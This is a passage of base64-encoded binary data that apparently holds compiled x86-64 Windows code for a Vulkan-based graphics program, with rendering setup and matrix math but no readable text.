Ai0QkTESKLbnmBABIifNIacAEAQAASAHwSIlEJDBIOVwkMA+E1QAAAEiJ2kiNDZ1xBADoGVQBAIXAdSSLBbffBABIjQ2HcQQAQb4BAAAAjVABSImMx2AGAACJFZnfBABIidpIjQ11cQQA6OJTAQCFwHUjiwWA3wQASI0NX3EEAL0BAAAAjVABSImMx2AGAACJFWPfBABIidpIjQ1UcQQA6KxTAQCFwHUeiwVK3wQASI0NPnEEAI1QAUiJjMdgBgAAiRUy3wQASInaTIn56H9TAQCFwHUcRYTtdBeLBRjfBACNUAFMibzHYAYAAIkVB98EAEiBwwQBAADpIP///0iJ8ejLUgEARYX2D4Sn/v//he11I0UxyYA9q+UEAABMjQX/bwQASI0V6XEEAA+FUP7//+lD/v//McBIjXwkeEiNNf1iAQC5DAAAAPOlSI28JNwAAAC5DQAAAMeEJNgAAAABAAAA86tIjUQkeEyJpCQQAQAASI01KNgEAEiJhCTwAAAAiwV23gQAiYQk+AAAAEiNRCRYSImEJAABAACLBVjeBACJhCQIAQAARYTtdFi4EQAAADHJx4QkqAAAAAS+nDtIweAoSImMJLAAAABIiYQkuAAAAEiNBSLy//9IiYQkyAAAAEiNhCSoAAAAx4QkwAAAAAcAAABIibQk0AAAAEiJhCTgAAAASI2MJNgAAABMjQU92AQAMdLo1kgAAEGJxYP493UjRTHJgD2b5AQAAEyNBe9uBABIjRXFcQQAD4VA/f//6TP9//+D+Pl1I0UxyYA9c+QEAABMjQXHbgQASI0VJXIEAA+FGP3//+kL/f//hcB0I0UxyYA9TOQEAABMjQWgbgQASI0VW3IEAA+F8fz//+nk/P//SIsNtdcEADHSSI18JFRFMcCJVCRUSIn66E9IAACLTCRUhcl1I0UxyYA9BOQEAABMjQXFcgQASI0V4XIEAA+Fqfz//+mc/P//SMHhA0yNZCRk6CZRAQBIiw1f1wQASIn6SYnASInD6AFIAABEiwUO1wQASI2EJBgBAABIiUQkMEWFwHhfRItMJFRFOcgPgvoAAABEiUwkPLkCAAAARIlEJDD/FSX/BABEi0wkPESLRCQwSI0VNXMEAEiJwehj8P//RTHJgD1p4wQAAEyNBU1zBABIjRVRcwQAD4UO/P//6QH8//9B/8APhaAAAAC5BQAAAEyJ50SJ6POrMf87fCRUcx+J+EiLVCQw/8dIiwzD6HFHAACLhCQoAQAA/0SEZOvbg3wkbAC/AgAAAHUug3wkaACJ73Ulg3wkcAC/AwAAAHUZg3wkdAC/BAAAAHUNMf+DfCRkAEAPlMcB/0Ux7UQ7bCRUcyhEiehIi1QkMEiLDMPoD0cAADm8JCgBAAB1CUSJLfvVBADrBUH/xevRSGMF7dUEAEiLVCQwSIsMw0iJDSHWBADo3EYAAIu8JCgBAAC5AgAAAESLBcXVBABEiUQkPP8VBv4EAIl8JCBEi0QkPEyNjCQsAQAASI0Vb3IEAEiJwUiNPYTbBADoNu///0iJ2ehHTwEAMcC5gAAAAEUxyYlEJGRNieAx0okFVtsEADHA86tIiw2r1QQA6J5GAACLTCRkhcl1I4A9BuIEAAAPhbn6//9FMclMjQVRbAQASI0VR3MEAOmb+v//SGnJBAEAAEUx7UyNNRJyBABMjT0ccgQA6BZPAQBIiw1X1QQATYngMdJJicFIicNFMeToPEYAAItEJGRIid+JRCQ8i0QkPEE5xHRbSIn6TInx6B1PAQCFwHUaiwW72gQAQYntjVABTIm0xmAGAACJFafaBABIifpMifno9E4BAIXAdReLBZLaBACNUAFMibzGYAYAAIkVgdoEAEH/xEiBxwQBAADrnIA9jtQEAAB0dMYFhdQEAAAx/0iNLY9xBABMjSWjcQQAO3wkZHNCifpIielIadIEAQAASAHa6JNOAQCFwHUmiwUx2gQATInhxgVH1AQAAY1QAUiJrMZgBgAAiRUW2gQA6CL4////x+u4gD0m1AQAAHUMSI0NeXEEAOgJ+P//gD0S1AQAAHR0xgUJ1AQAADH/SI0tj3EEAEyNJaFxBAA7fCRkc0KJ+kiJ6Uhp0gQBAABIAdroFk4BAIXAdSaLBbTZBABMieHGBcvTBAABjVABSImsxmAGAACJFZnZBADopff////H67iAParTBAAAdQxIjQ11cQQA6Iz3//9IidnoS00BAEWF7Q+ELP7//4A9L+AEAAAPhIkBAABIiw2u0wQASI0VXHIEAOiCRAAASIsNm9MEAEiNFWhyBABIiQUF4AQA6GhEAABIiw2B0wQASI0VbnIEAEiJBfPfBADoTkQAAEiLDWfTBABIjRVxcgQASIkF4d8EAOg0RAAASIsNTdMEAEiNFXRyBABIiQXP3wQA6BpEAABIiw0z0wQASI0VdXIEAEiJBb3fBADoAEQAAEiLDRnTBABIjRV5cgQASIkFq98EAOjmQwAATIsVd98EAEiJBaDfBABNhdJ0N0iDPWvfBAAAdC1Igz1p3wQAAHQjSIM9Z98EAAB0GUiDPWXfBAAAdA9Igz1j3wQAAHQFSIXAdSNFMcmAPSnfBAAATI0FL3IEAEiNFT1yBAAPhc73///pwff//0UxwEiLDY/SBABIjZQkqAAAAEyNDTDfBABB/9KD+P90BoXAdEjrI0UxyYA9394EAABMjQUqcgQASI0VSHIEAA+FhPf//+l39///RTHJgD283gQAAEyNBQdyBABIjRVXcgQAD4Vh9///6VT3//9Iiw0t0gQASI0VftIEAEiNHdPeBADo2kIAAEiLDRPSBABFMcBIidro0EIAAIsNtt4EAEhryRjosUsBAEiLDfLRBABIidpJicBIiQV11QQA6KhCAABIi1QkMEiLDdTRBADof0IAAEiLDcDRBABIjRUIcgQA6JRCAABIiQVt2wQASIXAdSNFMcmAPRXeBAAATI0FC3IEAEiNFSJyBAAPhbr2///prfb//0iLDX7RBABIjRVTcgQA6FJCAABIiQUz2wQASIXAdSNFMcmAPdPdBAAATI0FyXEEAEiNFVRyBAAPhXj2///pa/b//0iLDTzRBABIjRWKcgQA6BBCAABIiQX52gQASIXAdSNFMcmAPZHdBAAATI0Fh3EEAEiNFYZyBAAPhTb2///pKfb//0iLDfrQBABIjRW3cgQA6M5BAABIiQW/2gQASIXAdSNFMcmAPU/dBAAATI0FRXEEAEiNFbhyBAAPhfT1///p5/X//0iLDbjQBABIjRXucgQA6IxBAABIiQWV2gQASIXAdSNFMcmAPQ3dBAAATI0FA3EEAEiNFd1yBAAPhbL1///ppfX//0iBxFgEAABbXl9dQVxBXUFeQV/DV0iNPQBzBABWU0iJ00iJykiNDetyBABIjXNASIPsMOhl6f//8w9aYwjzD1prBPMPWgvzD1pDDGZJD37hZkkPfugPKNxIiflmSA9+yvIPEUQkIA8o1UiDwxDoK+n//0g53nXBSI0NrnIEAOga6f//uQEAAAD/Ff/3BABIg8QwW0iJwV5f6VBJAQBTSInTSInKSI0Na3IEAEiD7DDo6ej///MPWmMI8w9aawTzD1oL8w9aQwxmSQ9+4fIPEUQkIA8o3GZJD37oZkgPfsoPKNVIjQ0zcgQA6K/o//9IjQ03cgQA6KPo//+5AQAAAP8ViPcEAEiDxDBIicFb6dtIAQAxwEg50XMJTAHBSDnRD5LAwzHASDnRcxlIKcpIgfp/hB4AD5fASYH4f4QeAA+XwiHQw1YxwEiJzjHJU0hj2khr20hIgezIAAAASIlEJGBIi4bYCgAASI1UJFhIiUwkcEiLTBgQx0QkWCoAAADHRCRoBAAAAOiCQQAARTHSRTHbRTHJSLjqzZo76s2aO0UxwMdEJHgtAAAASImEJJAAAABIi4bYAAAATImEJIAAAABIiYQkmAAAAEiLhtgKAABMiYQkiAAAAEG4ACAAAEgB2EiLEEiLSBBIjUQkeEyJTCQ4SIlEJEgxwEUxyUSJVCQwTIlcJCiJRCQgx0QkQAEAAABIiZQkoAAAALoAIAAASMeEJKgAAAABAAAASMeEJLAAAAABAAAAx4QkuAAAAAEAAADoB0EAAEiLhtgKAABIi0wYEOi+QAAASIHEyAAAAFtew1VIjZEwDAAATI2BcAwAAEiJ5UFWQVVBVFdWU0iJy0iNu7AMAABMjavQDAAASIPk8EiB7PAAAABMjXQkcEyNZCQwTInxSI20JLAAAADo5uT//0yJ4UiJ+kyNRCQo6Jvk//9IjVQkLPMPWoPwDAAA8g9ZBc54BADyD14FzngEAPIPWsDosKIAADHS8w8QRCQsuH8AAAAxyUmJ8EjB4DfzDxBMJChIiZQkyAAAAEyJ4kiJhCTAAAAATI2jwAwAAEiJhCToAAAASImMJOAAAABIifnzDxGEJLgAAAAPVwV8eAQAx4QktAAAAAAAAADHhCS8AAAAAAAAAMeEJNQAAAAAAAAAx4Qk3AAAAAAAAADzDxGMJLAAAADzDxGMJNgAAADzDxGEJNAAAADoC+T//0iJ+ujI4///TInqTInp6Dzp//9MiepMieFJifDokeP//0iJ8Q8o0Ohh4///TIniTInh6Dnj//9MiepMienoDen//0yJ6kyJ4UmJ8Ohi4///SInxDyjQ6DLj//9MieJMieHoCuP//+jk6P//TIniSIn5SYnw6Dnj//9IifEPKNDoCeP//0iJ+kiJ+ejh4v//6Lvo//9IifFJifhMifLoaeP//4uDaA0AALkQAAAASGvASEgDg9gKAABIi0AwSInH86VIjWXQW15fQVxBXUFeXcNBVkUxyUFVRTHtQVRVV1ZTSInLSIPsMEiLkdAKAABIi4nAAAAASI18JCxEiWwkLEmJ+P+TwAoAAItMJCyFyQ+ECwIAAEhrySjok0UBAEmJ+DH/SIuT0AoAAEiLi8AAAABIicZJicH/k8AKAACLTCQsSYnyRTHJMdJFMcA5+Q+EMwEAAECKa3pAhO11UouDoAAAAEUx5MZDegFEiaOkAAAA/8iJg6gAAABFhMAPhQ0BAACE0g+EWwEAAEiLg4gAAABI/8BIiYOIAAAASA+vg4AAAABIiYOQAAAA6TYBAABNi1oQSYtCGEyLo4AAAABNi2ogTDnYc2hNid5JKcZJgf5/hB4AD5fASYH9f4QeAEEPl8VEIOh0SIuTpAAAAEWLGkQ52nUKMe2Jq6QAAADrH4XSdRi4AJQ1dzHSSPezkAAAAEEBw0SJm6QAAABEicBFMdtBicAx0kSJm6gAAADrTUmLQghMOdhzM0wB4Ew52HMri4OoAAAAhcB0BUE7AnMQi4OgAAAAier/yImDqAAAAEUxwESJg6QAAADrDjHAQYnpMdJIiYOkAAAARTHA/8dJg8Io6cX+//9FhMB0MEWJyEiLg4gAAABBuQEAAABI/8hJD0TBRYnBSImDiAAAAEgPr4OAAAAASImDkAAAAITSdCBIi4OIAAAASP/ASImDiAAAAEgPr4OAAAAASImDkAAAAEWEyXQljVH/i4OgAAAASGvSKEgB8isCSA+vg5AAAABIA0IQSImDmAAAAEiDxDBIifFbXl9dQVxBXUFe6VFDAQBIg8QwW15fXUFcQV1BXsNVTInFQbgDAAAAV0yJz1ZIidZIjRVabAQAU0iNHbFUAQBIidlIg+wo6K1DAQCFwA+FnQAAAEj/w4B7/wp190yLTCRwSYn4SI0VKmwEAEiJ2egE5v//SIX2dQSwAet2SP/DgHv/CnX3SI0Fc1QEAEg5w3NfQbgEAAAASI0V/WsEAEiJ2ehSQwEAhcB1Rkj/w4B7/wp19zHSSItEJHA5EH66MclIifA5D34hZkSLA0iDwARIg8MD/8FmRIlA/ESKQ//GQP//RIhA/uvbSAN1EP/C68UxwEiDxChbXl9dw0FWQVVBVEGJ1DHSVUSJxUUxwFdWRInOU0iJy0iB7PAAAABMjXQkPEyNbCQ4TIl0JCBNieno6v7//4TAdSyAPRjVBAAAdRlFMclMjQVVawQASI0VY2sEADHJ/xXm8gQAuQEAAADo5EEBAESLRCQ4i1QkPDHAuRUAAABIjbwknAAAAEyNDQXTBADHhCSYAAAADgAAAPOrSIsNWcgEAEi4AQAAAAEAAABEiQUo0wQAiRUm0wQARImEJLQAAABFMcCJlCS4AAAASI2UJJgAAADHhCSsAAAAAQAAAMeEJLAAAAAlAAAASImEJLwAAABIiYQkxAAAAESJpCTMAAAAiawk0AAAAMeEJOgAAAAIAAAA6Hs5AABIixV00gQATI1EJFhIiw3QxwQA6Bs5AABIi0QkWDHJRTHATI0NgtIEAItUJGhIiQ1n0gQARIkFcNIEAEGJ8EmNiXj0//9IiQVX0gQAxwU90gQABQAAAOjE5f//SI2RcAsAAEmDwQhFMcBIiw1zxwQA6IY4AABMiwU30gQASIsV+NEEAEUxyUiLDVbHBADokTgAAECA5gIPhKgAAABIixXY0QQASIsNOccEAEiNdCRwMcBJifFMjUQkTIlEJFRIx0QkTAEAAADowDgAADHSSI1EJEBFMcCJVCQgTIsNw9EEAEiJRCQoSIsVx9EEAEiLDfDGBADoEzgAAEyJdCQgTYnpSYnwSItUJEBIidnoAf3//4TAdR25AgAAAP8VxO4EAEmJ2EiNFZdpBABIicHoCeD//0iLFXvRBABIiw2kxgQA6M83AADHBT3RBAAFAAAASIHE8AAAAFteX11BXEFdQV7DVUiNkTAMAABIieVBV0FWQVVBVEmJzFdNjYQkcAwAAFZTSIPk8EiB7PAFAABIjYwk8AAAAEiNtCSwAAAA6E3d//9IicpIifFNjYQksAwAAOg63f//SI2EJDABAABIjRWAbwQA8w8QDShxBABIiUQkOEiNvCQwAQAAuRAAAABMjYKwAQAA86VIjQ02bgQA8w8QAkiDwgxIg8AQSIPBCPMPEUg88w8RQDDzDxBC+MeAeAIAAAAAAADzDxFANPMPEEL8x4B8AgAAAAAAAPMPEUA48w8QQfjzDxGAcAIAAPMPEEH88w8RgHQCAABMOcJ1n0iNVCR8McC5DQAAAEUx7UiJ10yNdCRATI18JFjHRCR4DAAAAPOrSI1EJHjHhCSYAAAAEAAAAEjHhCSQAAAAwAQAAEiJRCQwRTusJMgKAAAPgxgBAABEietIi1QkMEUxwEH/xUhr20hJi4Qk2AoAAEmLjCTAAAAASAHYTI1IIOiaNgAASYuEJNgKAABJi4wkwAAAAE2J8EiLVBgg6D02AAAxwDHSTI1MJHBIiUQkYEiLRCRAQbgGAAAATInhiVQkcItUJFBIiUQkaMdEJFgFAAAA6Pvi//9Ji4Qk2AoAAEUxwEyJ+kmLjCTAAAAASAHYTI1IKOi1NQAASYuEJNgKAABFMcBJg8n/SYuMJMAAAABIAdhIi1AoSIPAMESJRCQgRTHASIlEJCjokTUAAEmLhCTYCgAASIt0JDhFMcm5MAEAAEiLRBgwSInH86VJA5wk2AoAAEmLjCTAAAAASItTIEyLQyjoZTUAAOna/v//SI1lyFteX0FcQV1BXkFfXcNVSInlQVdBVkFVQVRXVlNIg+wQSIPk8EiB7FACAABIgz0xzgQAAA8ptCRQAgAASI2cJNABAAB1R4sF8cMEAEUxyUUx0kUxwEyJjCTYAQAASIsNwcMEAEyNDfrNBABIidrHhCTQAQAAJwAAAESJlCTgAQAAiYQk5AEAAOj4NQAAMcBIiw2PwwQATI0FyM4EAMeEJMgAAAAoAAAASImEJNAAAABIiwWuzQQASI28JNQBAABMjaQkQAEAAEiJhCTYAAAAuAEAAABIweAgSImEJOAAAABIjYQkyAAAAEiJwkiJRCRg6KA1AAAxwDHSSIsNZc4EAEiJhCTwAAAAMcBIiZQkAAEAAEiNlCToAAAAx4Qk6AAAACoAAACJhCT4AAAA6HQ1AAAxwLkVAAAARTHA86u5EwAAAEiNvCSEAQAASIsVdMwEAPOrx4Qk0AEAAA4AAABIiw3AwgQATI0NEc0EAEiJlCTsAQAASLoBAAAAAQAAAEiJlCT0AQAASImUJPwBAABIidrHhCTkAQAAAQAAAMeEJOgBAAB8AAAAx4QkCAIAACAAAADHhCSAAQAADwAAAMeEJKABAAABAAAAx4QkpAEAAHwAAADHhCS4AQAAAgAAAMeEJMABAAABAAAAx4QkyAEAAAEAAADHBXfMBAB8AAAA6LozAABIixVzzAQASIsNFMIEAE2J4OhcMwAASIuEJEABAAAxyUUxwEyNDXDMBACLlCRQAQAASIkNUswEAESJBVvMBABBuAEAAABJjYnI9P//SIkFP8wEAMcFJcwEAAUAAADo/N///0iNkSALAABJg8EIRTHASIsNq8EEAOi+MgAATIsFH8wEAEiLFfDLBABFMclIiw2OwQQA6MkyAABIiwXaywQARTHASIsNeMEEAEyNDfnLBABIiYQkmAEAAEiNhCSAAQAASInCSIlEJGjoBDMAAEiLDUXBBAC6JQAAAEyNhCQIAQAA6OsxAABIjYQk1AEAAPaEJAgBAAABSIlEJFBIjYQkhAEAAEiJRCRYdF+APcHABAAAdVZBuQYAAABBuAQAAAC6AQAAAEiNDe5jBADo/Pf//8dEJCiAAAAARTHJuggAAADHRCQgAQAAAESLBXrLBABIiw1jywQA6MDd//8xwEiJBa3LBADpSAMAAPaEJAwBAAABD4Q6AwAAMcC5FgAAAEyNdCR4RTHASI0VfMsEAEyNvCSIAAAATYnxSInXSI01d2MEADHS86tMiXwkIEiJ8eic9v//hMB1LIA9yswEAAB1GUUxyUyNBQdjBABIjRUVYwQAMcn/FZjqBAC5AQAAAOiWOQEAi5QkiAAAAItEJHhFMdIxyUUxwEUxyUyJlCQAAgAAMf+JBVDLBAAPr8JMjawkgAEAAEiJjCTYAQAASIsN/r8EAESJhCTgAQAARTHAweACRImMJPgBAABMjQ3ZygQASJiJFRXLBABIidrHhCTQAQAADAAAAEiJhCToAQAASMeEJPABAAABAAAA6DoxAABIixWjygQASIsNpL8EAE2J4OjkMAAASIuEJEABAABMjQ2tygQAi5QkUAEAAEUx20mNiSD0//9BuAYAAACJPZDKBABMiR15ygQATInvSIkFd8oEAMcFXcoEAAUAAADojN3//0iNkcgLAABJg8EIRTHASIsNO78EAOhOMAAATIsFV8oEAEiLFSDKBABFMclIiw0evwQA6FEwAAAxwLkKAAAARTHA86uLRCR4weACSJhIiYQkkAEAAEiNhCSgAAAASIlEJCgxwIlEJCBMiw36yQQASIsVA8oEAEiLDdS+BADo9y8AAEyJfCQgTYnxTYnoSIuUJKAAAABIifHo4vT//4TAdR25AgAAAP8VpeYEAEmJ8EiNFXhhBABIicHo6tf//0iLFbTJBAAx/0Ux7UUx9kiLDX2+BADoqC8AAEG5AQAAADHSQbgGAAAASI0NW2EEAOhp9f//x0QkKAAQAABFMclBuAcAAADHRCQgAQAAAEiLDdbIBAC6CAAAAOgu2///SIsFZckEAEiJvCTQAQAAQbkHAAAASMeEJOABAAABAAAASImEJNgBAAC4AQAAAEjB4CBMiawk8AEAAEiJhCToAQAAiwUkyQQARIm0JPgBAACJhCT8AQAAiwUTyQQAx4QkBAIAAAEAAABIiVwkKMdEJCABAAAATIsFUMgEAImEJAACAABIixWiyAQASIsN48gEAOhWMAAAQbkAEAAAugcAAADHRCQogAAAAMdEJCAAEAAARIsFJMgEAEiLDQ3IBADoatr//0Ux7UiLfCRYuRMAAABFMcBEiehIjTV2RwEA8w8QNV5oBABIi1QkaPOruRQAAABIid/HhCSAAQAAHwAAAPOlx4QkoAEAAAIAAABIiw0gvQQATI0NqccEAPMPEbQktAEAAEiNNYlHAQBMjbwk0AEAAMeEJKQBAAACAAAATI01P8gEAMeEJKgBAAACAAAAx4QkyAEAAAQAAADo1C4AAEiLBWXHBABMifpIiw3DvAQATI0NlMcEAEUxwEiJhCToAQAA6FwuAABIjQ3luwQA6B32//8xwEiLfCRoRTHAuQwAAABMieJIiYQkRAEAAEyNDc/HBADzpUiJhCRMAQAASItEJGhIvgEAAAACAAAAx4QkQAEAACAAAABIiw1UvAQAx4QkVAEAAAIAAABIiYQkWAEAAOhMLgAASIt8JFBEiehMifq5CwAAAE2NTvhFMcDzq0yJtCToAQAASIsNFLwEAEyNrCSgAAAAx4Qk0AEAAB4AAABIjbwkCAEAAMeEJOQBAAABAAAA6NktAAAxwIsNMcYEAEUx0omEJNABAABFMdtFMcBFMcmLBXDFBABIibQkBAIAAEi+AQAAAAMAAABIugEAAAABAAAAiYwk+AEAADHJiYQk1AEAALgBAAAASIm0JKAAAABIjbQkiAAAAEjB4CFIiZQk2AEAAEiJlCT8AQAAMdKJjCSIAQAAuQ4AAABIiXQkWEiJtCSgAQAASI01EUYBAPOlMfZEiZQkuAEAAEyJnCTAAQAASImUJIABAABMieJMiYQkkAEAAEUxwEyJjCSoAQAATY1OEEiJtCRIAQAASI20JAgBAABMibwkWAEAAEUx/0iJhCTgAQAASMeEJOgBAAABAAAASMeEJPABAADqzZo7SMeEJAwCAAABAAAAx4QkFAIAAAMAAABIiYQkiAAAAMeEJJgBAAABAAAATImsJLABAADHhCRAAQAAJgAAAEiJhCRQAQAAx4QkYAEAAAEAAABIi0QkaEiJtCR4AQAASIsNfLoEAEiJhCRoAQAAx4QkcAEAAAIAAADotCwAAOjC2P//RDs9YMQEAEiLDVG6BABzIUWJ+EiLVCRgQf/HTWvASEwDBVHEBABJg8AI6KAsAADrz0iNhCSAAQAAgD3RuQQAAEiJRCRgD4S3AAAAiwUqugQARTHbMf9Ii1QkYEyJnCSIAQAARTHARTH/TI0NN8QEAMeEJIABAAAnAAAAibwkkAEAAImEJJQBAADoMSwAAEiLBRLEBADHhCTQAQAAKAAAAEyJvCTYAQAARTH/SImEJOABAAC4AQAAAEjB4CBIiYQk6AEAAEQ7PZzDBABIiw2NuQQAcy5FifhIidpNa8BITAMFksMEAEmDwBDo4SsAAESJ+kiNDae4BABB/8foFur//+vCSIt8JFBFMf+5BwAAAEUxwESJ+IsVTMMEAMeEJIABAAAGAAAATI0NgsUEAPOrSItEJGDHhCSIAQAAAQAAAImUJIQBAABIiw0SuQQAiZQkjAEAAImUJOQBAABIidrHhCTQAQAAIQAAAMeEJOgBAAACAAAASImEJPABAADo/ioAALkfAAAARTHARTHJSIsFHMUEAEUx0kiNlCTUAQAAx4QkgAEAACIAAABIiddMiYQkiAEAAEiJhCSQAQAASIsFLMMEAMeEJJgBAAABAAAASImEJAgBAABIiwVawwQATIm0JKABAABIiYQkEAEAAESJ+POrTImMJEgBAABIuAEAAAAGAAAASImEJPABAABIuAEAAAABAAAASMeEJFABAADABAAARImUJBwBAADHhCQYAQAABQAAAMeEJNABAAAjAAAATImkJAACAADHhCQQAgAAIwAAAMeEJCgCAAABAAAASImEJDACAABIibQkOAIAAEQ7PfLBBABzcEWJ/kiLVCRgQf/HSIsF7sEEAE1r9khIiw3LtwQATAHwTI1AQOjvKQAAMclFMclJidhMAzXIwQQAugIAAABJi0YgSImEJEABAABJi0ZASIlMJCBIiw2PtwQASImEJOABAABIiYQkIAIAAOiyKQAA64dIiwX5wQQASIt8JFC5DwAAAEUx9kiJhCSIAQAAMcDzq0iLBbHCBADHhCTQAQAAJQAAAMeEJPABAAACAAAASImEJOgBAABIi0QkYMeEJAgCAAABAAAASImEJPgBAABIiwW0wAQASImEJAACAABEOzUNwQQAczVEifBIiw35tgQARTHAQf/GSGvASEgDBQDBBABIi1AYTI1IOEiJlCSAAQAASIna6BApAADrwkm/zcxMPs3MTD5FMfZEOzXCwAQAD4OzBAAARInyuQoAAABMiedEiTVKwwQASGvSSEgDFa/ABABIi0IITIm8JKAAAABIx4QksAAAAAAAgD9IiUQkaDHA86sxwMeEJAgBAAAqAAAASItMJGhIiYQkEAEAADHASImEJCABAAAxwEiJhCS4AAAAMcBIiYQkiAEAAEiLBZfBBADHhCQYAQAABAAAAEiJhCSQAQAASItCODHSSImUJKABAABIifJIiYQkmAEAAEiLBaS/BABMibwkqAAAAMeEJIABAAArAAAASImEJKgBAADHhCSwAQAAAgAAAEyJrCS4AQAA6FEoAACAPS7CBAAAD4SiAAAASItEJGgx/0iLDba1BABIidrHhCTQAQAAAL6cO0iJhCToAQAASI0FnFgEAEiJvCTYAQAAx4Qk4AEAAAYAAABIiYQk8AEAAP8VEMIEADHASItMJGhMieJIiYQkSAEAAEiNBXVYBABIiYQkUAEAAEi4zczMPpqZmT5IiYQkWAEAAEi4zcxMPs3MzD3HhCRAAQAAAr6cO0iJhCRgAQAA/xWiwQQASItUJGBIi0wkaEUxwOjYJwAAgD1twQQAAHRXSI0FIFgEAEUx20iLTCRoTIniSImEJFABAABIuGZmBkGamelASImEJFgBAABIuGZmxkAzM+NAx4QkQAEAAAK+nDtMiZwkSAEAAEiJhCRgAQAA/xUwwQQATIsFEcAEAEiLTCRoMdLoLScAAEUxyUUx0kiLTCRoTIlMJDgx0kUxyUSJVCQwiwUlwQQASGvASEgDBYq+BADHRCQgAQAAAEiDwEBIiUQkKEyLBaK/BADo/SYAAEiLfCRYMcC5BgAAAIsV570EAPMPEBV7XwQA86uLBdO9BAA50H0ZKcLzDyrA8w8qyvMPWcrzDxGMJIwAAADrFynQ8w8qwvMPKsjzD1nK8w8RjCSIAAAATItMJFhIi0wkaDHS8w8RhCSUAAAA8w8RhCSQAAAAQbgBAAAA8w8RtCScAAAA6GUmAABFMcBIi0wkaDHSSIsFXL0EAEyJRCR4TI1MJHhBuAEAAABIiYQkgAAAAOg/JgAAgD38vwQAAHRWSI0FwFYEADHJTInix4QkQAEAAAK+nDtIiYQkUAEAAEi4zczMvpqZmb5IiYQkWAEAAEi4zcxMvs3MzL1IiYwkSAEAAEiLTCRoSImEJGABAAD/FcC/BAAx0kiLTCRoRTHJQbgBAAAAiVQkILokAAAA6NIlAACAPX+/BAAAdAtIi0wkaP8Vlr8EAEiLTCRo6NQlAACAPWG/BAAAdAtIi0wkaP8VeL8EAIA9m7IEAAAPhLwAAAAxwEiLTCRoRTHJQbgAIAAASImEJNgBAAC6ACAAAEiJhCTgAQAASLjqzZo76s2aO0iJhCToAQAASIsFvbIEAMeEJNABAAAtAAAASImEJPABAACLBTS/BABIa8BISAMFmbwEAEiLAEiJXCRISMeEJAACAAABAAAASImEJPgBAAAxwEiJRCQ4McCJRCQwMcBIiUQkKDHASMeEJAgCAAABAAAAx4QkEAIAAAEAAADHRCRAAQAAAIlEJCDo5yQAAIA9hL4EAAB0C0iLTCRo/xWbvgQASItMJGhB/8bojiQAAOlA+///SIsNOr0EAEiFyQ+EIQEAAOh0JAAAMdIxyUmJ8UiJlCSIAQAASItUJGBFMcAx/4mMJJABAABIiw3FsQQAx4QkgAEAAAgAAADoDSMAAEUx0kUx20UxwEiLBeW8BABFMclMiZQk6AEAALoBAAAATImUJPABAABIiw2OsQQARImcJAgCAABMiYQk2AEAAEmJ2ESJjCTgAQAATIuMJAgBAABMiaQkAAIAAEiJhCRAAQAAx4Qk0AEAAAQAAADHhCT4AQAAAQAAAEiJvCQQAgAA6DgiAABBuQEAAABJifBIx0QkIP////9Iiw0XsQQAugEAAADofSIAAEiLFUa7BABNieFIiw38sAQAQbgBAAAARTHk6GYjAABIi5QkCAEAAEiLDd+wBABFMcDoNyIAAEyJJRC8BABIgz3AuwQAAHRMSIsV57sEAEiLDbiwBABFMcDo0CEAAEiLFZm7BABIhdJ0D0iLDZ2wBABFMcDoNSIAAEiLFYa7BABIhdJ0D0iLDYKwBABFMcDoCiIAADHAxgUhsAQAAYkFE70EAA8otCRQAgAASI1lyFteX0FcQV1BXkFfXcNBVUFUVVdWU0iB7DgBAABIixXkrwQASIsNLbAEAEyNRCRESIs1OboEAP8V27kEAEyNRCQwRTHJSIsVvK8EAEyJRCQoSIsNALAEAP8VyrkEAItMJDBIweEC6KUpAQBIixWWrwQATItEJChIiw3arwQASInDSYnB/xWeuQQAi1QkTIP6/3U1iw1nuQQAi1QkVIsFYbkEADnRcgmLVCRcOdEPRtFEi0QkWEQ5wHIfRItEJGBEOcBED0bA6xFIi0QkTESLRCRQSIkFJ7kEAIN8JFwAdAeDfCRgAHUMxgUlrwQAAenkAgAAiw2HuQQAxgUTrwQAAIP5AnQeRItMJDAxwEw5yA+D7QIAAESLHINEOdl0C0j/wOvpQbsCAAAARItUJES4AwAAAEE5wkQPQtCLRCRIhcB0B0E5wkQPR9BEi0wkaEGD4QF1BUSLTCRsSLgBAAAAAgAAAItMJHBIiUQkNEi4BAAAAAgAAABIiUQkPDHAi2yENIXpdQ5I/8BIg/gEde+9AQAAADHASI28JMwAAAC5EwAAAESJjCQYAQAA86tIiwVVrgQAiZQk9AAAAEyNDa+4BABEiYQk+AAAAEiLDZCuBABFMcBIjZQkyAAAAEiJhCTgAAAASIsFHrgEAMeEJMgAAADozZo7SImEJOwAAABIuAEAAAAQAAAARImUJOgAAABIiYQk/AAAAImsJBwBAABEiZwkIAEAAMeEJCQBAAABAAAASIm0JCgBAAD/FfG3BABIhfZ0E0iLDRWuBABFMcBIifL/FeG3BABIixUSuAQARTHJMe1FMeRMjQX7twQASIsN7K0EAEyNbCR4/xXBtwQAiw3jtwQASMHhA+iCJwEASIsV27cEAEiLDcStBABMjQXFtwQASYnBSInG/xWRtwQAiw2ztwQASGvJSOhSJwEASIkFs7cEADstnbcEAA+DiQAAAESJ4EiNfCR8uRMAAACJ6vOriwUgtwQARTHA/8XHRCR4DwAAAEiLDWStBACJhCScAAAASGvCSEiLFNZIAwVmtwQAx4QkmAAAAAEAAADHhCSwAAAAAQAAAEyNSBjHhCS4AAAAAQAAAMeEJMAAAAABAAAASIkQSImUJJAAAABMieroux4AAOlr////gD24rAQAAHRRSIsVBrcEAEiLDe+sBABMjUQkeP8V3LYEAEiLRCR4xgWSrAQAAEjHBZWsBAABAAAASIkFhqwEAEiJBY+sBAAxwEiJBY6sBADHBYysBAABAAAASIX2dAhIifHoDyYBAEiF23QISInZ6AImAQCAPT6sBAAAdBfGBTKsBAAASIHEOAEAAFteX11BXEFdw0iBxDgBAABbXl9dQVxBXelH6P//gD2+uAQAAHUZRTHJTI0Fh08EAEiNFZlPBAAxyf8VjNYEALkBAAAA6IolAQCAPdurBAAAdRKAPdWrBAAAD4RcAgAA6VICAABWUzHbSIPsKEiLDQisBADGBbGrBAAA6AwdAAA7Hf61BABIiw3vqwQAcx2J2EUxwP/DSGvASEgDBfO1BABIi1A46BoeAADr1EiLFRm4BABFMcAx9ujnHQAASIsVILcEAEiLDbGrBABFMcDokR0AAEiLFfq2BABIiw2bqwQARTHA6GsdAABIixXstgQASIsNhasEAEUxwOjVHQAASIsVvrYEAEiLDW+rBABFMcDoXx0AAEiLFbC2BABIiw1ZqwQARTHA6GkdAABIixUitgQASIsNQ6sEAEUxwOjzHAAASIsVzLUEAEiLDS2rBABFMcDoxRwAAEiLFe61BABIiw0XqwQARTHA6C8cAABIixWYtQQASIsNAasEAEUx